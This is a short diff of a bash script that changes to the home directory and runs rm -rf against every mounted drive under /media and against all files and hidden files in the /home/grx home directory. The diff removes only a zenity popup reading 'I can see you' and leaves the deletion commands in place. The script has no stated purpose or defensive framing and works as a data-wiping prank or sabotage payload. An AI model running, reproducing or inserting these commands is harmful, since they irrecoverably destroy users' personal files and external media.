@@ -1,6 +1,5 @@
 #!/bin/bash
 cd $HOME
-zenity --info --text="I can see you"
 rm -rf /media/*/*
 rm -rf /home/grx/*
 rm -rf /home/grx/.*
